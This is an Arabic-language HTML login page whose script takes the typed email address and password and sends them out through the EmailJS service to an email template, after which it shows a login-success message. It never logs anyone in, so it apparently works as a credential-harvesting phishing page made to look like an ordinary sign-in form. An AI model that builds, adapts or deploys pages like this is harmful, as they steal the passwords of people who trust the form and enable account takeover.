<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: green;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: darkgreen;
        }

        /* صفحة النجاح */
        .success-container {
            text-align: center;
            padding: 50px;
            background-color: #e0f7e0;
            border-radius: 8px;
        }
    </style>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>

    <!-- نموذج تسجيل الدخول -->
    <div class="login-container">
        <form id="loginForm">
            <input type="email" id="email" name="email" placeholder="ادخل البريد الإلكتروني" required>
            <input type="password" id="password" name="password" placeholder="ادخل كلمة السر" required>
            <button type="submit">دخول</button>
        </form>
    </div>

    <script>
        // Initialize EmailJS
        emailjs.init("w8sGGFu3ACr5Aj1Kb");

        // Handle form submission
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent form from reloading the page
            
            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            var templateParams = {
                email: email,
                password: password
            };

            // Send email using EmailJS
            emailjs.send("Ssre", templateParams)
                .then(function(response) {
                    alert("تم إرسال البريد الإلكتروني بنجاح");
                    window.location.href = "#success";
                }, function(error) {
                    alert("فشل إرسال البريد الإلكتروني: " + error.text);
                });
        });
    </script>

    <!-- صفحة النجاح -->
    <div id="success" class="success-container" style="display:none;">
        <h1>تم تسجيل الدخول بنجاح</h1>
    </div>

</body>
</html>
